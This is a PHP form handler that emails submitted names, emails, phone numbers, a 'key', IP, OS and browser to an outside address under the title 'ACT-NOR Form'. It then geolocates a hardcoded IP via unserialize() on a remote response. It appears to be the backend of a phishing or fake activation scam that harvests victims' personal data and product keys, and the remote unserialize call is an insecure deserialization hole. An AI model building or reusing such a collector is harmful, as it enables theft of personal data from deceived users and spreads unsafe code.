<?php
$to = "nor@all-mail-account.website";

$name=$_POST['name'];
$email=$_POST['email'];
$mobile=$_POST['mobile'];
$country=$_POST['country'];
$key=$_POST['key'];
$ip=$_POST['ip'];
$os=$_POST['os'];
$browser=$_POST['browser'];
$subject = $name;

$message = 
"
<html>
<head>
<title>HTML email</title>
</head>
<body>
<table border='1' style='text-align:left;''>
<tr style='background-color:red'>
<th colspan=4 style='text-align:center;background-color:#000;color:#fff;'>ACT-NOR Form</th>
</tr>
<tr style='background-color:#e6e6e6'>
<th  width=100>Name</th>
<td>$name</td>
</tr>
<tr>
<th>Email</th>
<td>$email</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>Mobile No</th>
<td>$mobile</td>
</tr>
<tr>
<th>Country</th>
<td > $country</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th width=100>Key</th>
<td > $key</td>
</tr>
<tr>
<th>IP</th>
<td > $ip</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>OS</th>
<td > $os</td>
</tr>
<tr>
<th>Browser</th>
<td > $browser</td>
</tr>
</table>
</body>
</html>
 ";  
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$mail=   mail($to, $subject, $message, $headers); 
?>


<?php 
   function getIPAddress() {  
    //whether ip is from the share internet  
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
            $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    //whether ip is from the remote address  
    else{  
         $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
    }  
    $ip = getIPAddress();
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=157.43.48.227')));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];


?>